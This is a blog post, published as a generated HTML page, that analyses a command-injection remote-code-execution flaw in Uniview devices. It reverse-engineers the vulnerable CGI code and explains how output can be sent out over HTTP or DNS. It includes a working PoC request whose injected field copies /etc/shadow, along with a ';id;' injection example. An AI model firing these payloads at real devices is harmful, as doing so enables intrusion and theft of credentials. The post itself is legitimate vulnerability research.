@@ -1,0 +1,531 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Uniview RCE 漏洞分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Uniview RCE 漏洞分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-10-27 19:53" pubdate>
+        2019年10月27日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Uniview RCE 漏洞分析</h1>
+            
+            <div class="markdown-body">
+              <p>Uniview RCE 漏洞分析，PoC来自<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43999">exploit-db</a></p>
+<a id="more"></a>
+
+<h2 id="1-漏洞复现"><a href="#1-漏洞复现" class="headerlink" title="1. 漏洞复现"></a>1. 漏洞复现</h2><p><strong>PoC</strong>:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">[Get <span class="hljs-regexp">/etc/</span>shadow]<br>http:<span class="hljs-regexp">//</span>IP:PORT<span class="hljs-regexp">/cgi-bin/m</span>ain-cgi?json=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-number">264</span>,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;bSelectAllPort&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;stSelPort&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;bSelectAllIp&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;stSelIp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;stSelNicName&quot;</span>:<span class="hljs-string">&quot;;cp%20/etc/shadow%20/tmp/packetcapture.pcap;&quot;</span>&#125;<br><br>[get the result]<br>http:<span class="hljs-regexp">//</span>IP:PORT<span class="hljs-regexp">/cgi-bin/m</span>ain-cgi?json=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-number">265</span>,<span class="hljs-string">&quot;szUserName&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;u32UserLoginHandle&quot;</span>:-<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>执行命令，将<code>/etc/shadow</code>文件复制到<code>/tmp/packetcapture.pcap</code>。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>获得<code>/etc/shadow</code>的内容。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/2.png" srcset="/img/loading.gif" alt="2"></p>
+<h2 id="2-漏洞详细分析"><a href="#2-漏洞详细分析" class="headerlink" title="2. 漏洞详细分析"></a>2. 漏洞详细分析</h2><p>对于该漏洞，我决定先利用<code>POC</code>去寻找漏洞点，然后逆着分析参数传递过程，来分析漏洞原理。</p>
+<h3 id="2-1-根据POC寻找漏洞点"><a href="#2-1-根据POC寻找漏洞点" class="headerlink" title="2.1 根据POC寻找漏洞点"></a>2.1 根据POC寻找漏洞点</h3><p>根据<code>POC</code>来分析一下漏洞。</p>
+<p>很明显，<code>POC</code>中<code>stSelNicName</code>这个参数传入了所执行的命令，使用IDA打开关键程序<code>main-cgi</code>，搜索字符串<code>stSelNicName</code>。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>进而找出存在该字符串的函数，<code>sub_2248C()</code>。<br>为了方便阅读，根据函数实现的功能，将函数名修改为<code>startTcpDump</code>。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>可以看到在该函数的后面，进行了命令的拼接，由此猜测，应该是前面没有做好对传入的参数进行过滤，进行拼接后就使用<code>system()</code>执行了代码。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>这里应该就是漏洞点了，接下来往上找一下调用，分析一下传参，来验证自己的猜想。</p>
+<h3 id="2-2-参数传递过程分析"><a href="#2-2-参数传递过程分析" class="headerlink" title="2.2 参数传递过程分析"></a>2.2 参数传递过程分析</h3><p>首先往上查找调用<code>startTcpDump()</code>的函数。<br>找到<code>sub_477FC()</code></p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>再往上，就到了<code>CGI</code>请求开始处理的地方<code>sub_4E2A4()</code>。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/7.png" srcset="/img/loading.gif" alt="7"><br>可以看到，程序在第<code>8</code>行获得了传入的请求数据<code>v0</code>，经过处理后传入关键函数<code>sub_477FC()</code>中。</p>
+<p>跟进函数<code>getRequestValue()(也就是sub_164D0)</code>，</p>
+<p>可以看到，当请求方法为<code>GET</code>时，该函数会获得并返回经过<code>URL</code>编码之后的数据，而且程序不支持<code>POST</code>请求。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/8.png" srcset="/img/loading.gif" alt="8"></p>
+<p>也就是说在<code>dealWithCGIRequest()</code>函数中，第<code>13</code>行<code>v2 = sub_477FC(v1);</code>传入的<code>v1</code>是一个字符串。<br>对于<code>POC</code>来说，就是</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">json=&#123;&quot;cmd&quot;:264,&quot;status&quot;:1,&quot;bSelectAllPort&quot;:1,&quot;stSelPort&quot;:0,&quot;bSelectAllIp&quot;:1,&quot;stSelIp&quot;:0,&quot;stSelNicName&quot;:&quot;;cp%20/etc/shadow%20/tmp/packetcapture.pcap;&quot;&#125;<br></code></pre></td></tr></table></figure>
+<p>然后进入函数<code>sub_477FC()</code>，可以看到在第<code>237</code>-<code>269</code>，对传入的字符串进行了处理。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/9.png" srcset="/img/loading.gif" alt="9"></p>
+<p>从处理流程来看，使用<code>=</code>和<code>&amp;</code>对字符串进行分割，获取<code>key</code>和<code>value</code>，存储在<code>v5</code>中。<br><code>counter</code>中存储了传入的键值对的数目。</p>
+<p><code>v5</code>的数据结构:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key</span> \<span class="hljs-number">0</span> value \<span class="hljs-number">0</span> key \<span class="hljs-number">0</span> value \<span class="hljs-number">0</span> ....<br></code></pre></td></tr></table></figure>
+<p>接下来函数对处理后的字符串进行遍历，处理请求。</p>
+<p>首先对<code>Value</code>值进行<code>url</code>解码。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/10.png" srcset="/img/loading.gif" alt="10"></p>
+<p>然后继续往下：</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/11.png" srcset="/img/loading.gif" alt="11"></p>
+<p>对于代码中的<code>v11</code>来说，它就是经过<code>urldecode</code>之后的<code>v5</code>。<br>也就是<code>*v11 == &quot;key&quot;</code>、<code>*(v11+32) == &quot;value&quot;</code>。<br>然后根据传入的<code>key</code>来决定处理方式，在<code>POC</code>中我们传入了一个<code>json</code>数据。</p>
+<p>此时<code>343</code>行<code>if</code>条件成立，在<code>347</code>行，将<code>value</code>值传入函数<code>sub_4E204()</code>，对<code>json</code>字符串进行解析，返回一个存储了<code>json</code>的数据结构。<br>然后<code>351</code>行获得<code>cmd</code>的值，然后根据该值，使用<code>switch</code>来决定如何进行处理后续请求。</p>
+<p>跟进<code>347</code>行<code>v23 = sub_4E204((v11 + 32));</code>，分析一下<code>json</code>的数据结构。<br>在这里我只是大致分析了下，动态调试环境弄不好，只能静态分析，后面还涉及到递归，有点困难。</p>
+<p>往下走两步，跟进到<code>sub_4E164(a1, 0, 0);</code>，其中<code>a1</code>就是传入的<code>value</code>值。<br>后面的分析过程太过于繁琐，而且并没有分析出有关数据的过滤的函数，就说一下我分析的<code>json</code>的数据结构吧。</p>
+<blockquote>
+<p>在<code>json</code>中有六种数据，分别是数字（整数或者浮点数）、字符串、逻辑值 （<code>true</code>或<code>false</code>）、数组、对象、<code>null</code>。</p>
+</blockquote>
+<p>在该程序中，是通过调用<code>getFortySpace()</code>(<code>也就是sub_4CA70</code>)来分配空间的，</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/12.png" srcset="/img/loading.gif" alt="12"></p>
+<p>根据整个流程调用来判断，存储<code>json</code>中键值对的数据结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">result[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//指向下一个对象</span><br>result[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//指向上一个对象</span><br>result[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//指向嵌套的数组或者对象</span><br>result[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//种类 0 == false、1 == true、2 == null、3 == 数字、4 == 字符串、5 == 数组、6 == 对象</span><br>result[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//字符串</span><br>result[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//整数</span><br>result[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>result[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>result[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前键值对的key值</span><br>result[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>
+<p>猜测使用了<code>cjson</code>这个库。</p>
+<p>在解析<code>json</code>的流程中，只是调用了<code>leftStrip()</code>(也就是<code>sub_4C788</code>)，来保证所有字符串都以可见字符开头。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/13.png" srcset="/img/loading.gif" alt="13"></p>
+<p>在获取双引号之间的值时处理<code>unicode</code>编码，没有其他的针对性的过滤手段。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/14.png" srcset="/img/loading.gif" alt="14"></p>
+<p>然后回到函数<code>sub_477FC()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">v23 = sub_4E204((v11 + <span class="hljs-number">32</span>));              <span class="hljs-comment">// 推测该方法用来解析json字符串</span><br>v24 = v23;<br><span class="hljs-keyword">if</span> ( !v23 )<br>    formatStr(<span class="hljs-string">&quot;cgi_common.c&quot;</span>, <span class="hljs-number">2284</span>, <span class="hljs-string">&quot;CGI_COMMON_ProcessData&quot;</span>, <span class="hljs-string">&quot;json_Req is :\&quot;NULL\&quot;.&quot;</span>);<br>dest = getValueByKey(v24, <span class="hljs-string">&quot;cmd&quot;</span>)[<span class="hljs-number">5</span>];<br>formatStr(<span class="hljs-string">&quot;cgi_common.c&quot;</span>, <span class="hljs-number">2289</span>, <span class="hljs-string">&quot;CGI_COMMON_ProcessData&quot;</span>, <span class="hljs-string">&quot;Begin to process transcat.&quot;</span>);<br>v25 = sub_4CAC4();                        <span class="hljs-comment">// 获得一个result[3] == 6的空间</span><br>formatStr(<span class="hljs-string">&quot;cgi_common.c&quot;</span>, <span class="hljs-number">2293</span>, <span class="hljs-string">&quot;CGI_COMMON_ProcessData&quot;</span>, <span class="hljs-string">&quot;Web id = %d&quot;</span>, dest);<br><span class="hljs-keyword">switch</span> ( dest )s<br>&#123;<br>    ...<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">264u</span>:<br>        v22 = startTcpDump(v24);<span class="hljs-comment">//命令执行的关键函数。</span><br>        <span class="hljs-keyword">break</span>;<br>    ...<br></code></pre></td></tr></table></figure>
+<p>到现在，传入的<code>json</code>数据已经进入前面我们之前猜测的漏洞点了。</p>
+<h3 id="2-3-漏洞点详细分析"><a href="#2-3-漏洞点详细分析" class="headerlink" title="2.3 漏洞点详细分析"></a>2.3 漏洞点详细分析</h3><p>重新回到函数<code>startTcpDump(int a1)</code>中。</p>
+<p><code>25</code>行到<code>51</code>行程序对系统状态进行判断。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/15.png" srcset="/img/loading.gif" alt="15"></p>
+<p>根据上面的条件，我们必须传入<code>bSelectAllPort</code>、<code>bSelectAllIP</code>、<code>stSelIp</code>、<code>stSelPort</code>、<code>stSelNicName</code>这五个值。</p>
+<p>在后面可以看到，四个不同条件下的命令执行语句都拼接了<code>stSelNicName</code>字符串。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/16.png" srcset="/img/loading.gif" alt="16"></p>
+<p>每个都分析下。</p>
+<p>第一条</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>第二条</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>第三条</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>第四条</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>可以知道，在传入的参数中，<code>bSelectAllIp</code>和<code>bSelectAllPort</code>只要都存在并且值是<code>0</code>或者<code>1</code>。就能够将<code>stSelNicName</code>的值拼接到执行的命令中。</p>
+<p>在这命令中，</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tcpdump -<span class="hljs-selector-tag">i</span> %s -<span class="hljs-selector-tag">p</span> -nn ....<br></code></pre></td></tr></table></figure>
+<p>其中<code>%s</code>的值可控，于是我们可以使用分号来截断命令。<br>比如传入<code>;id;</code>，则此时执行的命令为<code>tcpdump -i ;id; -p -nn ….</code>，命令<code>id</code>成功执行。<br>就这样实现命令注入，造成远程代码执行。</p>
+<p>从总体来看，该漏洞产生的最主要的原因就是，程序没有对传入的参数进行过滤，然后直接将其拼接到了命令中，造成了远程命令执行。</p>
+<h2 id="3-漏洞攻击利用思路"><a href="#3-漏洞攻击利用思路" class="headerlink" title="3. 漏洞攻击利用思路"></a>3. 漏洞攻击利用思路</h2><p>这是一个无回显的远程命令执行漏洞，不过既然能够执行命令了，就有很多利用方式了。</p>
+<h3 id="3-1-利用程序本身的功能"><a href="#3-1-利用程序本身的功能" class="headerlink" title="3.1 利用程序本身的功能"></a>3.1 利用程序本身的功能</h3><p>在该程序中提供了下载数据包的功能，文件路径为<code>/tmp/packetcapture.pcap</code>，我们可以执行命令，将输出重定向到该文件中，然后利用程序自身功能来下载到结果。<br>如果在<code>Web</code>目录中有权限，也可以直接将结果输出到<code>Web</code>目录下，然后下载得到结果。</p>
+<h3 id="3-2-使用HTTP请求和DNS解析外带数据"><a href="#3-2-使用HTTP请求和DNS解析外带数据" class="headerlink" title="3.2 使用HTTP请求和DNS解析外带数据"></a>3.2 使用HTTP请求和DNS解析外带数据</h3><p>如果目标主机可以连通外网，可以让目标主机向外网的一个自己可控的Web服务器发出携带数据的<code>HTTP</code>请求，从而将获得命令执行的结果。<br>也可以使目标主机解析携带有数据的二级域名，然后查询<code>DNS</code>解析记录。</p>
+<p>我们可以使用<code>ceye.io</code>这个平台来达到目的。</p>
+<p>使用<code>curl</code>向平台发起HTTP请求获取命令执行的结果。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/20.png" srcset="/img/loading.gif" alt="20"></p>
+<p>成功获取执行命令的内容。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/19.png" srcset="/img/loading.gif" alt="19"></p>
+<p>使用<code>DNS</code>请求获取数据</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/21.png" srcset="/img/loading.gif" alt="21"></p>
+<p>成功获取执行命令的内容</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/22.png" srcset="/img/loading.gif" alt="22"></p>
+<p>需要注意的是，在外带数据的时候应该要对数据<code>base64</code>编码一下，或者其他编码也可以，防止特殊字符对命令的执行过程产生影响。我这个树莓派上没有<code>base64</code>，在这就不演示了。</p>
+<h3 id="3-3-一点发现"><a href="#3-3-一点发现" class="headerlink" title="3.3 一点发现"></a>3.3 一点发现</h3><p>在漏洞分析过程中，发现该漏洞是有回显的，执行的命令会在请求头里出现。<br>只要执行的命令存在标准输出，即使用<code>echo</code>，而且输出内容中存在<code>:</code>，即可在响应头中获得命令执行的结果。</p>
+<p><img src="https://image.mengsec.com/Uniview-RCE/23.png" srcset="/img/loading.gif" alt="23"></p>
+<p>但是在分析漏洞点中没有发现获取命令结果的地方。<br>我认为应该是<code>CGI</code>程序将标准输出重定向到<code>Web</code>服务器上，内容中有<code>:</code>，符合响应头的标准，将内容成功输出。<br>从而获取到命令执行的结果。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/10/29/Java-Web-Struts2-Env-Build/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java Web安全入门——S2漏洞测试环境搭建</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/10/10/http-request-smugging/">
+                        <span class="hidden-mobile">协议层的攻击——HTTP Request Smuggling</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
